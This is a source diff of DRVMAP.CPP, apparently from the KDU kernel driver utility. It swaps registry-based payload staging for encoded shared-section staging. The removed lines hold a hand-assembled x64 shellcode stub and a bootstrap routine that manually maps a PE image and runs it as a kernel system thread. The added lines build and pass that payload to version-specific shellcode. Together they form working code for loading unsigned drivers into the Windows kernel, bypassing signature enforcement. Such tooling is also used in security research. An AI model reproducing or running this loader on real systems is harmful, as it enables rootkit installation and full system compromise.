@@ -4,9 +4,9 @@
 *
 *  TITLE:       DRVMAP.CPP
 *
-*  VERSION:     1.02
+*  VERSION:     1.10
 *
-*  DATE:        11 Feb 2021
+*  DATE:        02 Apr 2021
 *
 *  Driver mapping routines.
 *
@@ -17,431 +17,300 @@
 *
 *******************************************************************************/
 #include "global.h"
-#include "irp.h"
-
-//
-// WARNING: shellcode DOESN'T WORK in DEBUG
-//
-
-#define BOOTSTRAPCODE_SIZE 1944 //correct this value if Import change it size
-
-//
-// Size in bytes
-// InitCode         16
-// Import           88
-// BootstrapCode    1944
-//
-
-//sizeof 2048
-typedef struct _SHELLCODE {
-    BYTE InitCode[16];
-    BYTE BootstrapCode[BOOTSTRAPCODE_SIZE];
-    HANDLE ReadyEventHandle;
-    FUNC_TABLE Import;
-} SHELLCODE, * PSHELLCODE;
-
-SHELLCODE* g_ShellCode;
 
 /*
-* ExAllocatePoolTest
+* KDUShowPayloadResult
 *
 * Purpose:
 *
-* User mode test routine.
+* Query and display shellcode result.
 *
 */
-PVOID NTAPI ExAllocatePoolTest(
-    _In_ POOL_TYPE PoolType,
-    _In_ SIZE_T NumberOfBytes)
-{
-    PVOID P;
-    UNREFERENCED_PARAMETER(PoolType);
-
-    P = VirtualAlloc(NULL, NumberOfBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-    return P;
-}
-
-/*
-* ExFreePoolTest
-*
-* Purpose:
-*
-* User mode test routine.
-*
-*/
-VOID NTAPI ExFreePoolTest(
-    _In_ PVOID P)
-{
-    VirtualFree(P, 0, MEM_RELEASE);
-}
-
-/*
-* IofCompleteRequestTest
-*
-* Purpose:
-*
-* User mode test routine.
-*/
-VOID IofCompleteRequestTest(
-    _In_ VOID* Irp,
-    _In_ CCHAR PriorityBoost)
-{
-    UNREFERENCED_PARAMETER(Irp);
-    UNREFERENCED_PARAMETER(PriorityBoost);
-    return;
-}
-
-/*
-* PsCreateSystemThreadTest
-*
-* Purpose:
-*
-* User mode test routine.
-*
-*/
-NTSTATUS NTAPI PsCreateSystemThreadTest(
-    PHANDLE ThreadHandle,
-    ULONG DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes,
-    HANDLE ProcessHandle,
-    PCLIENT_ID ClientId,
-    PKSTART_ROUTINE StartRoutine,
-    PVOID StartContext)
-{
-    UNREFERENCED_PARAMETER(ThreadHandle);
-    UNREFERENCED_PARAMETER(DesiredAccess);
-    UNREFERENCED_PARAMETER(ObjectAttributes);
-    UNREFERENCED_PARAMETER(ProcessHandle);
-    UNREFERENCED_PARAMETER(ClientId);
-    UNREFERENCED_PARAMETER(StartRoutine);
-    UNREFERENCED_PARAMETER(StartContext);
-    return STATUS_SUCCESS;
-}
-
-IO_STACK_LOCATION g_testIostl;
-
-/*
-* IoGetCurrentIrpStackLocationTest
-*
-* Purpose:
-*
-* User mode test routine.
-*
-*/
-FORCEINLINE
-PIO_STACK_LOCATION
-IoGetCurrentIrpStackLocationTest(
-    _In_ PIRP Irp
+VOID KDUShowPayloadResult(
+    _In_ PKDU_CONTEXT Context,
+    _In_ HANDLE SectionHandle
 )
 {
-    UNREFERENCED_PARAMETER(Irp);
-    g_testIostl.MajorFunction = IRP_MJ_CREATE;
-    return &g_testIostl;
-}
+    NTSTATUS ntStatus;
+    ULONG payloadSize = 0;
+    SIZE_T viewSize;
 
-/*
-* SizeOfProc
-*
-* Purpose:
-*
-* Very simplified. Return size of procedure when first ret meet.
-*
-*/
-ULONG SizeOfProc(
-    _In_ PBYTE FunctionPtr)
-{
-    ULONG   c = 0;
-    UCHAR* p;
-    hde64s  hs;
+    union {
+        union {
+            PAYLOAD_HEADER_V1* v1;
+            PAYLOAD_HEADER_V2* v2;
+            PAYLOAD_HEADER_V3* v3;
+        } Version;
+        PVOID Ref;
+    } pvPayloadHead;
 
-    __try {
+    pvPayloadHead.Ref = NULL;
 
-        do {
-            p = FunctionPtr + c;
-            hde64_disasm(p, &hs);
-            if (hs.flags & F_ERROR)
-                break;
-            c += hs.len;
+    ScSizeOf(Context->ShellVersion, &payloadSize);
+    viewSize = ALIGN_UP_BY(payloadSize, PAGE_SIZE);
 
-        } while (*p != 0xC3);
+    ntStatus = NtMapViewOfSection(SectionHandle,
+        NtCurrentProcess(),
+        &pvPayloadHead.Ref,
+        0,
+        PAGE_SIZE,
+        NULL,
+        &viewSize,
+        ViewUnmap,
+        0,
+        PAGE_READWRITE);
 
-    }
-    __except (EXCEPTION_EXECUTE_HANDLER) {
-        return 0;
-    }
-    return c;
-}
+    if (NT_SUCCESS(ntStatus)) {
 
-/*
-* FakeDispatchRoutine
-*
-* Purpose:
-*
-* Bootstrap shellcode.
-* Read image from registry, process relocs and run it.
-*
-* IRQL: PASSIVE_LEVEL
-*
-*/
-NTSTATUS NTAPI FakeDispatchRoutine(
-    _In_ struct _DEVICE_OBJECT* DeviceObject,
-    _Inout_ struct _IRP* Irp,
-    _In_ PSHELLCODE ShellCode)
-{
-    NTSTATUS                        status;
-    ULONG                           returnLength = 0, isz, dummy;
-    HANDLE                          hKey = NULL, hThread;
-    UNICODE_STRING                  str;
-    OBJECT_ATTRIBUTES               obja;
-    KEY_VALUE_PARTIAL_INFORMATION   keyinfo;
-    KEY_VALUE_PARTIAL_INFORMATION* pkeyinfo;
-    ULONG_PTR                       Image, exbuffer, pos;
+        switch (Context->ShellVersion) {
 
-    PIO_STACK_LOCATION              StackLocation;
+        case KDU_SHELLCODE_V2:
+            printf_s("[~] Shellcode result, system worker: 0x%p\r\n", (PVOID)pvPayloadHead.Version.v1->IoStatus.Information);
+            break;
 
-    PIMAGE_DOS_HEADER               dosh;
-    PIMAGE_FILE_HEADER              fileh;
-    PIMAGE_OPTIONAL_HEADER          popth;
-    PIMAGE_BASE_RELOCATION          rel;
-
-    DWORD_PTR                       delta;
-    LPWORD                          chains;
-    DWORD                           c, p, rsz;
-
-    WCHAR                           szRegistryKey[] = {
-        L'\\', L'R', L'E', L'G', L'I', L'S', L'T', L'R', L'Y', L'\\',\
-        L'M', L'A', L'C', L'H', L'I', L'N', L'E', 0
-    };
-
-    USHORT                          cbRegistryKey = sizeof(szRegistryKey) - sizeof(WCHAR);
-
-    WCHAR                           szValueKey[] = { L'~', 0 };
-
-    USHORT                          cbValueKey = sizeof(szValueKey) - sizeof(WCHAR);
-
-    PKEVENT                         ReadyEvent;
-
-    UNREFERENCED_PARAMETER(DeviceObject);
-
-#ifdef _DEBUG
-    StackLocation = IoGetCurrentIrpStackLocationTest(Irp);
-#else
-    StackLocation = IoGetCurrentIrpStackLocation(Irp);
-#endif
-
-    if ((StackLocation->MajorFunction == IRP_MJ_CREATE)
-        && (DeviceObject->SectorSize == 0))
-    {
-
-        str.Buffer = szRegistryKey;
-        str.Length = cbRegistryKey;
-        str.MaximumLength = str.Length + sizeof(UNICODE_NULL);
-
-#ifdef _DEBUG
-        InitializeObjectAttributes(&obja, &str, OBJ_CASE_INSENSITIVE, 0, 0);
-#else
-        InitializeObjectAttributes(&obja, &str, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, 0);
-#endif
-
-        status = ShellCode->Import.ZwOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
-        if (NT_SUCCESS(status)) {
-
-            str.Buffer = szValueKey;
-            str.Length = cbValueKey;
-            str.MaximumLength = str.Length + sizeof(UNICODE_NULL);
-
-            status = ShellCode->Import.ZwQueryValueKey(hKey, &str, KeyValuePartialInformation,
-                &keyinfo, sizeof(KEY_VALUE_PARTIAL_INFORMATION), &returnLength);
-
-            if ((status == STATUS_BUFFER_OVERFLOW) ||
-                (status == STATUS_BUFFER_TOO_SMALL))
-            {
-                pkeyinfo = (KEY_VALUE_PARTIAL_INFORMATION*)ShellCode->Import.ExAllocatePool(NonPagedPool, returnLength);
-                if (pkeyinfo) {
-
-                    status = ShellCode->Import.ZwQueryValueKey(hKey, &str, KeyValuePartialInformation,
-                        (PVOID)pkeyinfo, returnLength, &dummy);
-                    if (NT_SUCCESS(status)) {
-
-                        ShellCode->Import.ZwDeleteValueKey(hKey, &str);
-
-                        Image = (ULONG_PTR)&pkeyinfo->Data[0];
-                        dosh = (PIMAGE_DOS_HEADER)Image;
-                        fileh = (PIMAGE_FILE_HEADER)(Image + sizeof(DWORD) + dosh->e_lfanew);
-                        popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
-                        isz = popth->SizeOfImage;
-
-                        exbuffer = (ULONG_PTR)ShellCode->Import.ExAllocatePool(
-                            NonPagedPool, isz + PAGE_SIZE) + PAGE_SIZE;
-                        if (exbuffer != 0) {
-
-                            exbuffer &= ~(PAGE_SIZE - 1);
-
-                            if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
-                                if (popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
-                                {
-                                    rel = (PIMAGE_BASE_RELOCATION)((PBYTE)Image +
-                                        popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
-
-                                    rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
-                                    delta = (DWORD_PTR)exbuffer - popth->ImageBase;
-                                    c = 0;
-
-                                    while (c < rsz) {
-                                        p = sizeof(IMAGE_BASE_RELOCATION);
-                                        chains = (LPWORD)((PBYTE)rel + p);
-
-                                        while (p < rel->SizeOfBlock) {
-
-                                            switch (*chains >> 12) {
-                                            case IMAGE_REL_BASED_HIGHLOW:
-                                                *(LPDWORD)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
-                                                break;
-                                            case IMAGE_REL_BASED_DIR64:
-                                                *(PULONGLONG)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
-                                                break;
-                                            }
-
-                                            chains++;
-                                            p += sizeof(WORD);
-                                        }
-
-                                        c += rel->SizeOfBlock;
-                                        rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
-                                    }
-                                }
-
-                            isz >>= 3;
-                            for (pos = 0; pos < isz; pos++)
-                                ((PULONG64)exbuffer)[pos] = ((PULONG64)Image)[pos];
-
-                            hThread = NULL;
-                            InitializeObjectAttributes(&obja, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
-                            if (NT_SUCCESS(ShellCode->Import.PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, &obja, NULL, NULL,
-                                (PKSTART_ROUTINE)(exbuffer + popth->AddressOfEntryPoint), NULL)))
-                            {
-                                ShellCode->Import.ZwClose(hThread);
-                            }
-
-                            //
-                            // Fire the event to let userland know that we're ready
-                            //
-                            status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->ReadyEventHandle,
-                                SYNCHRONIZE | EVENT_MODIFY_STATE, NULL, 0, (PVOID*)&ReadyEvent, NULL);
-                            if (NT_SUCCESS(status))
-                            {
-                                ShellCode->Import.KeSetEvent(ReadyEvent, 0, FALSE);
-                                ShellCode->Import.ObfDereferenceObject(ReadyEvent);
-                            }
-
-                            DeviceObject->SectorSize = 512;
-                        }
-                    }
-                    ShellCode->Import.ExFreePool(pkeyinfo);
-                }
-            }
-            ShellCode->Import.ZwClose(hKey);
+        case KDU_SHELLCODE_V3:
+        case KDU_SHELLCODE_V1:
+        default:
+            printf_s("[~] Shellcode result: NTSTATUS (0x%lX)\r\n", pvPayloadHead.Version.v1->IoStatus.Status);
+            break;
         }
+
+        NtUnmapViewOfSection(NtCurrentProcess(), pvPayloadHead.Ref);
     }
-    ShellCode->Import.IofCompleteRequest(Irp, 0);
-    return STATUS_SUCCESS;
+    else {
+        printf_s("[!] Cannot map shellcode section, NTSTATUS (%lX)\r\n", ntStatus);
+    }
 }
 
 /*
-* KDUStorePayload
+* KDUStorePayloadInSection
 *
 * Purpose:
 *
-* Load input file as image, resolve import and store result in registry.
+* Load input file as image, resolve import and store result in shared section.
 *
 */
-BOOL KDUStorePayload(
-    _In_ LPWSTR lpFileName,
+BOOL KDUStorePayloadInSection(
+    _In_ PKDU_CONTEXT Context,
+    _Out_ PHANDLE SectionHandle,
+    _Out_ PSIZE_T ViewSize,
+    _In_ PVOID ImageBase,
     _In_ ULONG_PTR KernelImage,
-    _In_ ULONG_PTR KernelBase)
+    _In_ ULONG_PTR KernelBase
+)
 {
     BOOL bSuccess = FALSE;
-    HKEY hKey = NULL;
-    PVOID DataBuffer = NULL;
-    LRESULT lResult;
+    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
+    HANDLE sectionHandle = NULL;
+    PACL defaultAcl = NULL;
+    PVOID pvSharedSection = NULL, dataPtr = NULL;
 
-    NTSTATUS ntStatus;
-    ULONG isz;
-    PVOID Image = NULL;
-    PIMAGE_NT_HEADERS FileHeader;
-    UNICODE_STRING ustr;
+    PIMAGE_NT_HEADERS ntHeader;
 
-    ULONG DllCharacteristics = IMAGE_FILE_EXECUTABLE_IMAGE;
+    UNICODE_STRING uStr;
+    OBJECT_ATTRIBUTES objAttr;
+    PSECURITY_DESCRIPTOR sectionSD = NULL;
 
-    printf_s("[>] Entering %s\r\n", __FUNCTION__);
+    UUID secUuid;
+    WCHAR szName[100];
 
-    //
-    // Map input file as image.
-    //
-    RtlInitUnicodeString(&ustr, lpFileName);
-    ntStatus = LdrLoadDll(NULL, &DllCharacteristics, &ustr, &Image);
-    if ((!NT_SUCCESS(ntStatus)) || (Image == NULL)) {
-        printf_s("[!] Error while loading input driver file, NTSTATUS (0x%lX)\r\n", ntStatus);
-        return FALSE;
-    }
-    else {
-        printf_s("[+] Input driver file loaded at 0x%p\r\n", Image);
-    }
+    union {
+        union {
+            PAYLOAD_HEADER_V1 *v1;
+            PAYLOAD_HEADER_V2 *v2;
+            PAYLOAD_HEADER_V3 *v3;
+        } Version;
+        PVOID Ref;
+    } pvPayloadHead;
 
-    FileHeader = RtlImageNtHeader(Image);
-    if (FileHeader == NULL) {
-        printf_s("[!] Error, invalid NT header\r\n");
-    }
-    else {
+    FUNCTION_ENTER_MSG(__FUNCTION__);
+
+    *SectionHandle = NULL;
+    *ViewSize = 0;
+
+    do {
+
+        SIZE_T cbPayloadHead;
+
+        switch (Context->ShellVersion) {
+        case KDU_SHELLCODE_V3:
+            cbPayloadHead = sizeof(PAYLOAD_HEADER_V3);
+            break;
+        case KDU_SHELLCODE_V2:
+            cbPayloadHead = sizeof(PAYLOAD_HEADER_V2);
+            break;
+        case KDU_SHELLCODE_V1:
+        default:
+            cbPayloadHead = sizeof(PAYLOAD_HEADER_V1);
+            break;
+        }
 
         //
-        // Resolve import (ntoskrnl only) and write buffer to registry.
+        // Allocate space for header per version.
         //
-        isz = FileHeader->OptionalHeader.SizeOfImage;
+        pvPayloadHead.Ref = supHeapAlloc(cbPayloadHead);
+        if (pvPayloadHead.Ref == NULL) {
+            printf_s("[!] Error, payload header not allocated\r\n");
+            break;
+        }
 
-        DataBuffer = supHeapAlloc(isz);
-        if (DataBuffer) {
-            RtlCopyMemory(DataBuffer, Image, isz);
+        //
+        // Create SD for section.
+        //
+        ntStatus = supCreateSystemAdminAccessSD(&sectionSD, &defaultAcl);
+        if (!NT_SUCCESS(ntStatus)) {
+            printf_s("[!] Error, shared section SD not allocated, NTSTATUS (0x%lX)\r\n", ntStatus);
+            break;
+        }
+
+        //
+        // Create UUID.
+        //
+        if (RPC_S_OK != UuidCreate(&secUuid)) {
+            printf_s("[!] Could not allocate shared section UUID, GetLastError %lu\r\n", GetLastError());
+            break;
+        }
+
+        ntHeader = RtlImageNtHeader(ImageBase);
+
+        //
+        // Resolve import (ntoskrnl only).
+        //
+        ULONG isz = ntHeader->OptionalHeader.SizeOfImage;
+
+        dataPtr = supHeapAlloc(isz);
+        if (dataPtr) {
+            RtlCopyMemory(dataPtr, ImageBase, isz);
 
             printf_s("[+] Resolving kernel import for input driver\r\n");
-            supResolveKernelImport((ULONG_PTR)DataBuffer, KernelImage, KernelBase);
+            supResolveKernelImport((ULONG_PTR)dataPtr, KernelImage, KernelBase);
 
-            lResult = RegOpenKey(HKEY_LOCAL_MACHINE, NULL, &hKey);
-            if ((lResult == ERROR_SUCCESS) && (hKey != NULL)) {
-
-                lResult = RegSetKeyValue(hKey, NULL, TEXT("~"), REG_BINARY,
-                    DataBuffer, isz);
-
-                bSuccess = (lResult == ERROR_SUCCESS);
-
-                RegCloseKey(hKey);
-            }
-            supHeapFree(DataBuffer);
         }
+        else {
+            printf_s("[!] Could not allocate memory for image\r\n");
+            break;
+        }
+
+        //
+        // Create shared section.
+        //
+        RtlSecureZeroMemory(szName, sizeof(szName));
+        StringCchPrintf(szName, RTL_NUMBER_OF(szName), 
+            L"\\BaseNamedObjects\\{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
+            secUuid.Data1, secUuid.Data2, secUuid.Data3,
+            secUuid.Data4[0],
+            secUuid.Data4[1],
+            secUuid.Data4[2],
+            secUuid.Data4[3],
+            secUuid.Data4[4],
+            secUuid.Data4[5],
+            secUuid.Data4[6],
+            secUuid.Data4[7]);
+
+        RtlInitUnicodeString(&uStr, szName);
+        InitializeObjectAttributes(&objAttr, &uStr, OBJ_CASE_INSENSITIVE, NULL, sectionSD);
+
+        LARGE_INTEGER liSectionSize;
+        SIZE_T viewSize = ALIGN_UP_BY(isz + cbPayloadHead, PAGE_SIZE);
+
+        liSectionSize.QuadPart = viewSize;
+        *ViewSize = viewSize;
+
+        ntStatus = NtCreateSection(&sectionHandle,
+            SECTION_ALL_ACCESS,
+            &objAttr,
+            &liSectionSize,
+            PAGE_READWRITE,
+            SEC_COMMIT,
+            NULL);
+
+        if (!NT_SUCCESS(ntStatus)) {
+            printf_s("[!] Error, cannot create shared section, NTSTATUS (0x%lX)\r\n", ntStatus);
+            break;
+        }
+
+        ntStatus = NtMapViewOfSection(sectionHandle,
+            NtCurrentProcess(),
+            &pvSharedSection,
+            0,
+            PAGE_SIZE,
+            NULL,
+            &viewSize,
+            ViewUnmap,
+            MEM_TOP_DOWN,
+            PAGE_READWRITE);
+
+        if (NT_SUCCESS(ntStatus)) {
+
+            printf_s("[+] Resolving payload import\r\n");
+
+            if (ScResolveImportForPayload(
+                Context->ShellVersion,
+                pvPayloadHead.Ref,
+                KernelImage,
+                KernelBase))
+            {
+                EncodeBuffer(dataPtr, isz, Context->EncryptKey);
+
+                switch (Context->ShellVersion) {
+                case KDU_SHELLCODE_V3:
+                    pvPayloadHead.Version.v3->ImageSize = isz;
+                    break;
+                case KDU_SHELLCODE_V2:
+                    pvPayloadHead.Version.v2->ImageSize = isz;
+                    break;
+                case KDU_SHELLCODE_V1:
+                default:
+                    pvPayloadHead.Version.v1->ImageSize = isz;
+                    break;
+                }
+
+                //
+                // This field is version independent.
+                //
+                pvPayloadHead.Version.v1->IoStatus.Status = STATUS_UNSUCCESSFUL;
+
+                if (!ScStoreVersionSpecificData(Context, pvPayloadHead.Ref)) {
+                    printf_s("[!] Error, cannot store additional data for shellcode\r\n");
+                    break;
+                }
+
+                RtlCopyMemory(pvSharedSection, pvPayloadHead.Ref, cbPayloadHead);
+                RtlCopyMemory(RtlOffsetToPointer(pvSharedSection, cbPayloadHead), dataPtr, isz);
+
+                NtUnmapViewOfSection(NtCurrentProcess(), pvSharedSection);
+                *SectionHandle = sectionHandle;
+                bSuccess = TRUE;
+            }
+            else {
+                printf_s("[!] Error, resolving additional import failed\r\n");
+            }
+
+        }
+        else {
+            printf_s("[!] Error, shared section not mapped, NTSTATUS (0x%lX)\r\n", ntStatus);
+        }
+
+    } while (FALSE);
+
+    SetLastError(RtlNtStatusToDosError(ntStatus));
+
+    if (dataPtr) supHeapFree(dataPtr);
+    if (sectionSD) supHeapFree(sectionSD);
+    if (pvPayloadHead.Ref) supHeapFree(pvPayloadHead.Ref);
+    if (defaultAcl) supHeapFree(defaultAcl);
+
+    if (bSuccess == FALSE) {
+
+        if (pvSharedSection) NtUnmapViewOfSection(NtCurrentProcess(), pvSharedSection);
+        if (sectionHandle) NtClose(sectionHandle);
+
     }
 
-    printf_s("[<] Leaving %s\r\n", __FUNCTION__);
+    FUNCTION_LEAVE_MSG(__FUNCTION__);
 
     return bSuccess;
 }
-
-ULONG_PTR KDUResolveFunctionInternal(
-    _In_ ULONG_PTR KernelBase,
-    _In_ ULONG_PTR KernelImage,
-    _In_ LPCSTR Function)
-{
-    ULONG_PTR Address = supGetProcAddress(KernelBase, KernelImage, Function);
-    if (Address == 0) {
-        printf_s("[!] Error, %s address not found\r\n", Function);
-        return 0;
-    }
-
-    printf_s("[+] %s 0x%llX\r\n", Function, Address);
-    return Address;
-}
-
-#define ASSERT_RESOLVED_FUNC(FunctionPtr) { if (FunctionPtr == 0) break; }
 
 /*
 * KDUSetupShellCode
@@ -451,20 +320,26 @@ ULONG_PTR KDUResolveFunctionInternal(
 * Construct shellcode data, init code.
 *
 */
-BOOL KDUSetupShellCode(
+PVOID KDUSetupShellCode(
     _In_ PKDU_CONTEXT Context,
-    _In_ LPWSTR lpMapDriverFileName)
+    _In_ PVOID ImageBase,
+    _Out_ PHANDLE SectionHandle)
 {
-    BOOL bResult = FALSE;
     NTSTATUS ntStatus;
-    ULONG ProcedureSize = 0;
+    ULONG procSize = 0;
+    SIZE_T viewSize = 0;
+    HANDLE sectionHandle = NULL;
     UNICODE_STRING ustr;
 
     ULONG_PTR KernelBase, KernelImage = 0;
 
+    PVOID pvShellCode = NULL;
+
     WCHAR szNtOs[MAX_PATH * 2];
 
-    printf_s("[>] Entering %s\r\n", __FUNCTION__);
+    FUNCTION_ENTER_MSG(__FUNCTION__);
+
+    *SectionHandle = NULL;
 
     do {
 
@@ -493,156 +368,49 @@ BOOL KDUSetupShellCode(
         printf_s("[+] Ntoskrnl.exe mapped at 0x%llX\r\n", KernelImage);
 
         //
-        // Store input file in registry.
+        // Prepare and store payload for later shellcode use.
         //
-        if (!KDUStorePayload(lpMapDriverFileName, KernelImage, KernelBase)) {
-            printf_s("[!] Cannot write payload to the registry, abort\r\n");
+        if (!KDUStorePayloadInSection(Context,
+            &sectionHandle,
+            &viewSize,
+            ImageBase,
+            KernelImage,
+            KernelBase))
+        {
+            printf_s("[!] Error while mapping payload, abort\r\n");
             break;
         }
+
+        *SectionHandle = sectionHandle;
 
         //
         // Allocate shellcode.
         //
-        g_ShellCode = (SHELLCODE*)VirtualAlloc(NULL, sizeof(SHELLCODE),
-            MEM_RESERVE | MEM_COMMIT,
-            PAGE_EXECUTE_READWRITE);
+        pvShellCode = ScAllocate(Context->ShellVersion,
+            sectionHandle,
+            viewSize,
+            KernelImage,
+            KernelBase,
+            Context->MemoryTag,
+            &procSize);
 
-        if (g_ShellCode == NULL)
+        if (pvShellCode == NULL)
             break;
 
-        //
-        // Build initial code part.
-        //
-        // 00 call +5
-        // 05 pop r8
-        // 07 sub r8, 5
-        // 0B jmps 10 
-        // 0D int 3
-        // 0E int 3
-        // 0F int 3
-        // 10 code
-
-
-        //int 3
-        memset(g_ShellCode->InitCode, 0xCC, sizeof(g_ShellCode->InitCode));
-
-        //call +5
-        g_ShellCode->InitCode[0x0] = 0xE8;
-        g_ShellCode->InitCode[0x1] = 0x00;
-        g_ShellCode->InitCode[0x2] = 0x00;
-        g_ShellCode->InitCode[0x3] = 0x00;
-        g_ShellCode->InitCode[0x4] = 0x00;
-
-        //pop r8
-        g_ShellCode->InitCode[0x5] = 0x41;
-        g_ShellCode->InitCode[0x6] = 0x58;
-
-        //sub r8, 5
-        g_ShellCode->InitCode[0x7] = 0x49;
-        g_ShellCode->InitCode[0x8] = 0x83;
-        g_ShellCode->InitCode[0x9] = 0xE8;
-        g_ShellCode->InitCode[0xA] = 0x05;
-
-        // jmps 
-        g_ShellCode->InitCode[0xB] = 0xEB;
-        g_ShellCode->InitCode[0xC] = 0x03;
-
-        //
-        // Remember function pointers.
-        //
-
-        g_ShellCode->Import.ExAllocatePool =
-            (pfnExAllocatePool)KDUResolveFunctionInternal(KernelBase, KernelImage, "ExAllocatePool");
-        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ExAllocatePool);
-
-        g_ShellCode->Import.ExFreePool =
-            (pfnExFreePool)KDUResolveFunctionInternal(KernelBase, KernelImage, "ExFreePool");
-        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ExFreePool);
-
-        g_ShellCode->Import.PsCreateSystemThread =
-            (pfnPsCreateSystemThread)KDUResolveFunctionInternal(KernelBase, KernelImage, "PsCreateSystemThread");
-        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.PsCreateSystemThread);
-
-        g_ShellCode->Import.IofCompleteRequest =
-            (pfnIofCompleteRequest)KDUResolveFunctionInternal(KernelBase, KernelImage, "IofCompleteRequest");
-        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.IofCompleteRequest);
-
-        g_ShellCode->Import.ZwClose =
-            (pfnZwClose)KDUResolveFunctionInternal(KernelBase, KernelImage, "ZwClose");
-        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ZwClose);
-
-        g_ShellCode->Import.ZwOpenKey =
-            (pfnZwOpenKey)KDUResolveFunctionInternal(KernelBase, KernelImage, "ZwOpenKey");
-        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ZwOpenKey);
-
-        g_ShellCode->Import.ZwQueryValueKey =
-            (pfnZwQueryValueKey)KDUResolveFunctionInternal(KernelBase, KernelImage, "ZwQueryValueKey");
-        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ZwQueryValueKey);
-
-        g_ShellCode->Import.ZwDeleteValueKey =
-            (pfnZwDeleteValueKey)KDUResolveFunctionInternal(KernelBase, KernelImage, "ZwDeleteValueKey");
-        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ZwDeleteValueKey);
-
-        g_ShellCode->Import.ObReferenceObjectByHandle =
-            (pfnObReferenceObjectByHandle)KDUResolveFunctionInternal(KernelBase, KernelImage, "ObReferenceObjectByHandle");
-        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ObReferenceObjectByHandle);
-
-        g_ShellCode->Import.ObfDereferenceObject =
-            (pfnObfDereferenceObject)KDUResolveFunctionInternal(KernelBase, KernelImage, "ObfDereferenceObject");
-        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ObfDereferenceObject);
-
-        g_ShellCode->Import.KeSetEvent =
-            (pfnKeSetEvent)KDUResolveFunctionInternal(KernelBase, KernelImage, "KeSetEvent");
-        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.KeSetEvent);
-
-        /*g_ShellCode->Import.DbgPrint =
-            (pfnDbgPrint)KDUResolveFunctionInternal(KernelBase, KernelImage, "DbgPrint");
-        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.DbgPrint);*/
-
-
-        ProcedureSize = SizeOfProc((PBYTE)FakeDispatchRoutine);
-
-        //
-        // Shellcode test, unused in Release build.
-        //
-#ifdef _DEBUG
-        g_ShellCode->Import.ZwClose = &NtClose;
-        g_ShellCode->Import.ZwOpenKey = &NtOpenKey;
-        g_ShellCode->Import.ZwQueryValueKey = &NtQueryValueKey;
-        g_ShellCode->Import.ZwDeleteValueKey = &NtDeleteValueKey;
-        g_ShellCode->Import.ExAllocatePool = &ExAllocatePoolTest;
-        g_ShellCode->Import.ExFreePool = &ExFreePoolTest;
-        g_ShellCode->Import.IofCompleteRequest = &IofCompleteRequestTest;
-        g_ShellCode->Import.PsCreateSystemThread = &PsCreateSystemThreadTest;
-
-        DEVICE_OBJECT temp;
-
-        temp.SectorSize = 0;
-
-        FakeDispatchRoutine(&temp, NULL, g_ShellCode);
-#else
-        if (ProcedureSize != 0) {
-
-            printf_s("[+] Bootstrap code size = 0x%lX\r\n", ProcedureSize);
-
-            if (ProcedureSize > sizeof(g_ShellCode->BootstrapCode)) {
-                printf_s("[!] Bootstrap code size exceeds limit, abort\r\n");
-                break;
-            }
-            memcpy(g_ShellCode->BootstrapCode, FakeDispatchRoutine, ProcedureSize);
-            //supWriteBufferToFile(L"out.bin", g_ShellCode->BootstrapCode, ProcedureSize);
+        if (procSize == 0) {
+            printf_s("[!] Unexpected shellcode procedure size, abort\r\n");
+            ScFree(pvShellCode);
+            pvShellCode = NULL;
+            break;
         }
 
-        //((void(*)())g_ShellCode->InitCode)();
-
-        bResult = TRUE;
-#endif
+        printf_s("[+] Bootstrap code size = 0x%lX\r\n", procSize);
 
     } while (FALSE);
 
-    printf_s("[<] Leaving %s\r\n", __FUNCTION__);
+    FUNCTION_LEAVE_MSG(__FUNCTION__);
 
-    return bResult;
+    return pvShellCode;
 }
 
 /*
@@ -658,6 +426,7 @@ BOOL KDUCheckMemoryLayout(
     _In_ ULONG_PTR TargetAddress
 )
 {
+    ULONG dataSize;
     ULONG_PTR memPage, physAddrStart, physAddrEnd;
 
     KDU_PROVIDER* prov = Context->Provider;
@@ -668,13 +437,15 @@ BOOL KDUCheckMemoryLayout(
     if ((PVOID)prov->Callbacks.VirtualToPhysical == (PVOID)KDUProviderStub)
         return TRUE;
 
+    dataSize = ScSizeOf(Context->ShellVersion, NULL);
+
     memPage = (TargetAddress & 0xfffffffffffff000ull);
 
     if (prov->Callbacks.VirtualToPhysical(Context->DeviceHandle,
         memPage,
         &physAddrStart))
     {
-        memPage = (TargetAddress + sizeof(SHELLCODE)) & 0xfffffffffffff000ull;
+        memPage = (TargetAddress + dataSize) & 0xfffffffffffff000ull;
 
         if (prov->Callbacks.VirtualToPhysical(Context->DeviceHandle,
             memPage,
@@ -702,7 +473,7 @@ BOOL KDUCheckMemoryLayout(
 */
 BOOL KDUMapDriver(
     _In_ PKDU_CONTEXT Context,
-    _In_ LPWSTR lpMapDriverFileName)
